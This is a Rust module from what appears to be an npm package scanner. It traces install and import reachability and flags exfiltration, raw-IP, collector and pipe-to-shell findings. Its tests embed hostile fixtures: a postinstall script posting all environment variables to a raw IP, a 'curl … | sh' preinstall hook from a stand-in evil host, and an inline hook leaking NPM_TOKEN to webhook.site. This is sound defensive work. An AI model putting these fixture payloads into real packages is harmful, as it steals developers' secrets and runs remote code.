//! Package-level static analysis: run the JS analyzer over every file, work out
//! *when* each file runs (install hook, import/bin, or only when called), and
//! roll destinations up per host.
//!
//! The result (`PackageAnalysis`) depends only on the tarball bytes, so it is
//! cached forever by integrity and reused when this version is someone else's
//! "previous".

pub mod dest;
pub mod js;

use std::collections::{BTreeMap, HashMap, HashSet, VecDeque};

use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::model::{DestKind, Finding, Phase, Severity, Source};
use crate::tarball::PkgFile;
use crate::util::clip;

pub const INSTALL_HOOKS: [&str; 3] = ["preinstall", "install", "postinstall"];

/// Caps so a pathological package can't eat the server.
const MAX_FILES: usize = 4000;
const MAX_TOTAL_BYTES: usize = 64 * 1024 * 1024;

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct DestSite {
    pub host: String,
    pub url: String,
    pub kind: DestKind,
    pub phase: Phase,
    pub file: String,
    pub line: u32,
    pub note: Option<String>,
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct PackageAnalysis {
    pub findings: Vec<Finding>,
    pub dests: Vec<DestSite>,
    pub scripts: BTreeMap<String, String>,
    pub files_scanned: usize,
    pub files_unparsed: usize,
    pub truncated: bool,
}

#[derive(Default, Clone)]
pub struct Manifest {
    pub scripts: BTreeMap<String, String>,
    pub main: Option<String>,
    pub exports: Option<Value>,
    pub bin: Vec<String>,
}

/// Read package.json out of the tarball. npm runs lifecycle scripts from the
/// *tarball's* package.json, so that (not the registry manifest) is the truth.
pub fn manifest_from(files: &[PkgFile]) -> Option<Manifest> {
    let pj = files.iter().find(|f| f.path == "package.json")?.text.as_ref()?;
    let v: Value = serde_json::from_str(pj).ok()?;
    let scripts = v
        .get("scripts")
        .and_then(|s| s.as_object())
        .map(|o| o.iter().filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string()))).collect())
        .unwrap_or_default();
    let bin = match v.get("bin") {
        Some(Value::String(s)) => vec![s.clone()],
        Some(Value::Object(o)) => o.values().filter_map(|x| x.as_str().map(str::to_string)).collect(),
        _ => vec![],
    };
    Some(Manifest {
        scripts,
        main: v.get("main").and_then(|m| m.as_str()).map(str::to_string),
        exports: v.get("exports").cloned(),
        bin,
    })
}

fn is_js(path: &str) -> bool {
    path.ends_with(".js") || path.ends_with(".cjs") || path.ends_with(".mjs")
}

fn norm(path: &str) -> String {
    let mut out: Vec<&str> = Vec::new();
    for seg in path.split('/') {
        match seg {
            "" | "." => {}
            ".." => {
                out.pop();
            }
            s => out.push(s),
        }
    }
    out.join("/")
}

fn resolve(from_dir: &str, spec: &str, exists: &HashSet<&str>) -> Option<String> {
    let base = norm(&format!("{from_dir}/{spec}"));
    let candidates = [
        base.clone(),
        format!("{base}.js"),
        format!("{base}.cjs"),
        format!("{base}.mjs"),
        format!("{base}/index.js"),
        format!("{base}/index.cjs"),
        format!("{base}/index.mjs"),
    ];
    candidates.into_iter().find(|c| exists.contains(c.as_str()))
}

fn dir_of(path: &str) -> &str {
    path.rsplit_once('/').map(|(d, _)| d).unwrap_or("")
}

fn export_targets(v: &Value, out: &mut Vec<String>) {
    match v {
        Value::String(s) => out.push(s.clone()),
        Value::Object(o) => o.values().for_each(|x| export_targets(x, out)),
        Value::Array(a) => a.iter().for_each(|x| export_targets(x, out)),
        _ => {}
    }
}

/// Files a lifecycle command runs: `node x.js`, `node ./scripts/a.mjs --flag`,
/// `./install.js`. Inline `node -e "…"` code is returned separately.
pub fn script_entries(cmd: &str) -> (Vec<String>, Vec<String>) {
    let mut files = Vec::new();
    let mut inline = Vec::new();
    for part in cmd.split(['&', '|', ';']) {
        let toks = shell_words(part);
        let mut i = 0;
        while i < toks.len() {
            let t = toks[i].as_str();
            if (t == "node" || t.ends_with("/node")) && i + 1 < toks.len() {
                let mut j = i + 1;
                while j < toks.len() && toks[j].starts_with('-') {
                    if matches!(toks[j].as_str(), "-e" | "--eval" | "-p" | "--print") && j + 1 < toks.len() {
                        inline.push(toks[j + 1].clone());
                        j += 1;
                    } else if matches!(toks[j].as_str(), "-r" | "--require" | "--import") && j + 1 < toks.len() {
                        files.push(toks[j + 1].clone());
                        j += 1;
                    }
                    j += 1;
                }
                if j < toks.len() && !toks[j].starts_with('-') && is_js_or_bare(&toks[j]) {
                    files.push(toks[j].clone());
                }
                i = j + 1;
                continue;
            }
            if is_js(t) && (t.starts_with("./") || !t.contains(' ')) && i == 0 {
                files.push(t.to_string());
            }
            i += 1;
        }
    }
    (files, inline)
}

fn is_js_or_bare(t: &str) -> bool {
    is_js(t) || !t.contains('.') || t.starts_with("./") || t.starts_with("scripts/") || t.starts_with("lib/")
}

/// Minimal shell tokenizer: whitespace split with '…' and "…" quoting.
fn shell_words(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut started = false;
    for c in s.chars() {
        match quote {
            Some(q) if c == q => quote = None,
            Some(_) => cur.push(c),
            None if c == '\'' || c == '"' => {
                quote = Some(c);
                started = true;
            }
            None if c.is_whitespace() => {
                if started || !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                    started = false;
                }
            }
            None => cur.push(c),
        }
    }
    if started || !cur.is_empty() {
        out.push(cur);
    }
    out
}

pub fn analyze_package(files: &[PkgFile], home: &dest::Home, registry_scripts: &BTreeMap<String, String>) -> PackageAnalysis {
    let manifest = manifest_from(files).unwrap_or_else(|| Manifest { scripts: registry_scripts.clone(), ..Default::default() });
    let mut out = PackageAnalysis { scripts: manifest.scripts.clone(), ..Default::default() };

    // 1. analyze every JS file (within caps)
    let mut reports: HashMap<String, js::FileReport> = HashMap::new();
    let mut total = 0usize;
    for f in files.iter().filter(|f| is_js(&f.path)) {
        let Some(text) = &f.text else { continue };
        if reports.len() >= MAX_FILES || total + text.len() > MAX_TOTAL_BYTES {
            out.truncated = true;
            break;
        }
        total += text.len();
        let r = js::analyze(&f.path, text);
        if !r.parsed {
            out.files_unparsed += 1;
        }
        reports.insert(f.path.clone(), r);
    }
    out.files_scanned = reports.len();

    // 2. phases: install-hook reachable > import/bin reachable > runtime
    let exists: HashSet<&str> = files.iter().map(|f| f.path.as_str()).collect();
    let mut phase: HashMap<String, Phase> = HashMap::new();
    let mut inline_scripts: Vec<(String, String)> = Vec::new();
    let mut install_entries = Vec::new();
    for hook in INSTALL_HOOKS {
        if let Some(cmd) = manifest.scripts.get(hook) {
            let (entries, inline) = script_entries(cmd);
            install_entries.extend(entries.iter().filter_map(|e| resolve("", e, &exists)));
            inline_scripts.extend(inline.into_iter().map(|code| (hook.to_string(), code)));
        }
    }
    let mut import_entries: Vec<String> = Vec::new();
    let main = manifest.main.clone().unwrap_or_else(|| "index.js".into());
    import_entries.extend(resolve("", &main, &exists));
    if let Some(exp) = &manifest.exports {
        let mut targets = Vec::new();
        export_targets(exp, &mut targets);
        import_entries.extend(targets.iter().filter_map(|t| resolve("", t, &exists)));
    }
    import_entries.extend(manifest.bin.iter().filter_map(|b| resolve("", b, &exists)));
    let any_entry = !install_entries.is_empty() || !import_entries.is_empty();

    let bfs = |entries: &[String], p: Phase, phase: &mut HashMap<String, Phase>| {
        let mut q: VecDeque<String> = entries.iter().cloned().collect();
        let mut seen = HashSet::new();
        while let Some(f) = q.pop_front() {
            if !seen.insert(f.clone()) {
                continue;
            }
            let e = phase.entry(f.clone()).or_insert(p);
            if p > *e {
                *e = p;
            }
            if let Some(r) = reports.get(&f) {
                for spec in &r.requires {
                    if let Some(next) = resolve(dir_of(&f), spec, &exists) {
                        q.push_back(next);
                    }
                }
            }
        }
    };
    bfs(&install_entries, Phase::Install, &mut phase);
    bfs(&import_entries, Phase::Import, &mut phase);
    // 3. inline `node -e` code in hooks runs at install
    for (hook, code) in &inline_scripts {
        let name = format!("<{hook} script>");
        let r = js::analyze(&name, code);
        reports.insert(name.clone(), r);
        phase.insert(name, Phase::Install);
    }

    let phase_of = |path: &str| -> Phase {
        phase.get(path).copied().unwrap_or(if any_entry { Phase::Runtime } else { Phase::Unknown })
    };

    // 4. hits → findings; sink urls → destination sites
    let mut sites: Vec<DestSite> = Vec::new();
    let add_site = |url: &str, ph: Phase, file: &str, line: u32, sites: &mut Vec<DestSite>| {
        let Some(host) = dest::host_of(url) else { return };
        let (kind, note) = dest::classify(&host, url, home);
        sites.push(DestSite { host, url: url.to_string(), kind, phase: ph, file: file.to_string(), line, note });
    };
    let mut paths: Vec<&String> = reports.keys().collect();
    paths.sort();
    for path in paths {
        let r = &reports[path];
        let ph = phase.get(path).copied().unwrap_or_else(|| phase_of(path));
        for (u, line) in &r.sink_urls {
            add_site(u, ph, path, *line, &mut sites);
        }
        for h in &r.hits {
            for u in &h.urls {
                if h.id.starts_with("exec.") || h.id == "code.remote-eval" {
                    add_site(u, ph, path, h.line, &mut sites);
                }
            }
            let mut f = Finding::new(h.id, h.severity, Source::Static, h.title.clone(), h.detail.clone());
            f.phase = ph;
            f.file = Some(path.clone());
            f.line = Some(h.line);
            f.evidence = (!h.evidence.is_empty()).then(|| h.evidence.clone());
            f.destinations = h.urls.clone();
            if h.id == "net.exfil-flow" {
                f.severity = exfil_severity(&h.urls, &h.detail, home);
                if f.severity < Severity::High {
                    f.detail.push_str(" (sent only to the package's own registry or home)");
                }
            }
            out.findings.push(f);
        }
    }

    // 5. lifecycle commands themselves (`curl … | sh` in postinstall)
    for hook in INSTALL_HOOKS {
        let Some(cmd) = manifest.scripts.get(hook) else { continue };
        let tools = js::network_tools_in(cmd);
        let urls = dest::extract_urls(cmd);
        let file = format!("package.json#scripts.{hook}");
        for u in &urls {
            add_site(u, Phase::Install, &file, 0, &mut sites);
        }
        if !tools.is_empty() {
            let piped = js::pipes_to_shell(cmd);
            let mut f = Finding::new(
                if piped { "code.remote-eval" } else { "exec.network-tool" },
                if piped { Severity::High } else { Severity::Medium },
                Source::Static,
                if piped { "install script downloads code and pipes it to a shell".to_string() } else { format!("install script runs {}", tools.join(", ")) },
                format!("{hook}: {}", clip(cmd, 200)),
            );
            f.phase = Phase::Install;
            f.file = Some(file.clone());
            f.evidence = Some(clip(cmd, 200));
            f.destinations = urls.clone();
            out.findings.push(f);
        }
    }

    // 6. destination findings (net.new-destination is decided by the diff)
    let mut by_host: BTreeMap<String, DestSite> = BTreeMap::new();
    for s in &sites {
        let e = by_host.entry(s.host.clone()).or_insert_with(|| s.clone());
        if s.phase > e.phase {
            *e = s.clone();
        }
    }
    let mut expected = Vec::new();
    for s in by_host.values() {
        match s.kind {
            DestKind::RawIp => {
                let sev = if s.phase == Phase::Install { Severity::High } else { Severity::Medium };
                out.findings.push(dest_finding("net.raw-ip", sev, s, "connects to a raw IP address", "no domain name: nothing to look up or trust"));
            }
            DestKind::Collector | DestKind::ChatWebhook | DestKind::Paste | DestKind::Tunnel => {
                let what = match s.kind {
                    DestKind::Collector => "a request-catcher service (built to collect data)",
                    DestKind::ChatWebhook => "a chat webhook (a common exfiltration channel)",
                    DestKind::Paste => "a paste / file-drop service",
                    _ => "a tunnel to someone's machine",
                };
                out.findings.push(dest_finding("net.collector-destination", Severity::High, s, &format!("talks to {what}"), &s.url));
            }
            DestKind::KnownTelemetry => {
                let note = s.note.clone().unwrap_or_default();
                out.findings.push(dest_finding("net.known-telemetry", Severity::Info, s, "sends documented telemetry", &note));
            }
            DestKind::Registry | DestKind::PackageHome => expected.push(s.clone()),
            DestKind::Other => {}
        }
    }
    if !expected.is_empty() {
        let hosts: Vec<String> = expected.iter().map(|s| s.host.clone()).collect();
        let first = &expected[0];
        let mut f = dest_finding(
            "net.expected-download",
            Severity::Info,
            first,
            "downloads from its own registry or project home",
            &format!("talks to {}", hosts.join(", ")),
        );
        f.destinations = expected.iter().map(|s| s.url.clone()).collect();
        out.findings.push(f);
    }
    out.dests = by_host.into_values().collect();
    out.findings.sort_by(|a, b| b.severity.cmp(&a.severity).then(a.id.cmp(&b.id)));
    out
}

fn dest_finding(id: &str, sev: Severity, s: &DestSite, title: &str, detail: &str) -> Finding {
    let mut f = Finding::new(id, sev, Source::Static, title, detail);
    f.phase = s.phase;
    f.file = Some(s.file.clone());
    f.line = (s.line > 0).then_some(s.line);
    f.destinations = vec![s.url.clone()];
    f
}

/// A token sent only to the package's own registry/home (e.g. a GitHub token to
/// its own release API) is expected; anything with the whole environment or a
/// credential file never is.
fn exfil_severity(urls: &[String], detail: &str, home: &dest::Home) -> Severity {
    if urls.is_empty() || detail.contains("every environment variable") || detail.contains("credentials") || detail.contains("keys") {
        return Severity::High;
    }
    let own = urls.iter().all(|u| {
        dest::host_of(u)
            .map(|h| matches!(dest::classify(&h, u, home).0, DestKind::Registry | DestKind::PackageHome))
            .unwrap_or(false)
    });
    if own { Severity::Medium } else { Severity::High }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn pkg(files: &[(&str, &str)]) -> Vec<PkgFile> {
        files
            .iter()
            .map(|(p, t)| PkgFile { path: p.to_string(), size: t.len() as u64, text: Some(t.to_string()) })
            .collect()
    }

    #[test]
    fn script_entry_parsing() {
        let (f, i) = script_entries("node scripts/setup.js --quiet && node -e \"require('./x')\"");
        assert_eq!(f, ["scripts/setup.js"]);
        assert_eq!(i, ["require('./x')"]);
        let (f, _) = script_entries("node ./install");
        assert_eq!(f, ["./install"]);
        let (f, _) = script_entries("node-gyp rebuild");
        assert!(f.is_empty());
    }

    #[test]
    fn realistic_postinstall_exfil() {
        let files = pkg(&[
            ("package.json", r#"{"name":"evil","version":"1.0.1","main":"index.js","scripts":{"postinstall":"node scripts/setup.js"}}"#),
            ("index.js", "module.exports = () => 42;"),
            ("scripts/setup.js", "require('./lib/report');"),
            (
                "scripts/lib/report.js",
                r#"
                const https = require('https');
                const os = require('os');
                const payload = JSON.stringify({ env: process.env, host: os.hostname() });
                const req = https.request({ hostname: '45.77.12.9', path: '/c', method: 'POST' });
                req.end(payload);
                "#,
            ),
        ]);
        let a = analyze_package(&files, &dest::Home::default(), &BTreeMap::new());
        let exfil = a.findings.iter().find(|f| f.id == "net.exfil-flow").expect("exfil");
        assert_eq!(exfil.phase, Phase::Install, "reached from postinstall via require graph");
        assert_eq!(exfil.severity, Severity::High);
        assert_eq!(exfil.file.as_deref(), Some("scripts/lib/report.js"));
        let raw = a.findings.iter().find(|f| f.id == "net.raw-ip").expect("raw ip");
        assert_eq!(raw.severity, Severity::High, "raw IP at install is high");
        assert!(a.dests.iter().any(|d| d.host == "45.77.12.9" && d.kind == DestKind::RawIp));
    }

    #[test]
    fn esbuild_style_install_is_info_only() {
        let files = pkg(&[
            ("package.json", r#"{"name":"esbuild","main":"lib/main.js","scripts":{"postinstall":"node install.js"}}"#),
            ("lib/main.js", "module.exports = {}"),
            (
                "install.js",
                "const https=require('https');const v=require('./package.json').version;https.get(`https://registry.npmjs.org/@esbuild/darwin-arm64/-/darwin-arm64-${v}.tgz`, r=>{});",
            ),
        ]);
        let a = analyze_package(&files, &dest::Home::default(), &BTreeMap::new());
        assert!(a.findings.iter().all(|f| f.severity == Severity::Info), "{:#?}", a.findings);
        assert!(a.findings.iter().any(|f| f.id == "net.expected-download"));
    }

    #[test]
    fn telemetry_is_info_with_note() {
        let files = pkg(&[
            ("package.json", r#"{"name":"next","main":"index.js"}"#),
            ("index.js", "fetch('https://telemetry.nextjs.org/api/v1/record', { method: 'POST', body: JSON.stringify({event:'x'}) })"),
        ]);
        let a = analyze_package(&files, &dest::Home::default(), &BTreeMap::new());
        let t = a.findings.iter().find(|f| f.id == "net.known-telemetry").expect("telemetry");
        assert_eq!(t.severity, Severity::Info);
        assert!(t.detail.contains("NEXT_TELEMETRY_DISABLED"));
        assert_eq!(t.phase, Phase::Import);
    }

    #[test]
    fn curl_pipe_sh_in_hook() {
        let files = pkg(&[("package.json", r#"{"name":"x","scripts":{"preinstall":"curl -fsSL https://get.evil.example/i.sh | sh"}}"#)]);
        let a = analyze_package(&files, &dest::Home::default(), &BTreeMap::new());
        let f = a.findings.iter().find(|f| f.id == "code.remote-eval").expect("pipe to shell");
        assert_eq!(f.phase, Phase::Install);
        assert!(a.dests.iter().any(|d| d.host == "get.evil.example"));
    }

    #[test]
    fn inline_node_e_in_hook() {
        let files = pkg(&[(
            "package.json",
            r#"{"name":"x","scripts":{"install":"node -e \"require('https').get('https://webhook.site/x?d='+process.env.NPM_TOKEN)\""}}"#,
        )]);
        let a = analyze_package(&files, &dest::Home::default(), &BTreeMap::new());
        assert!(a.findings.iter().any(|f| f.id == "net.exfil-flow" && f.phase == Phase::Install), "{:#?}", a.findings);
        assert!(a.findings.iter().any(|f| f.id == "net.collector-destination"));
    }

    #[test]
    fn token_to_own_home_is_medium() {
        let home = dest::Home { hosts: vec!["github.com".into()], github_repo: Some("acme/tool".into()) };
        let files = pkg(&[
            ("package.json", r#"{"name":"tool","main":"index.js"}"#),
            ("index.js", "fetch('https://api.github.com/repos/acme/tool/releases', { headers: { authorization: 'Bearer ' + process.env.GITHUB_TOKEN } })"),
        ]);
        let a = analyze_package(&files, &home, &BTreeMap::new());
        let f = a.findings.iter().find(|f| f.id == "net.exfil-flow").unwrap();
        assert_eq!(f.severity, Severity::Medium);
    }
}
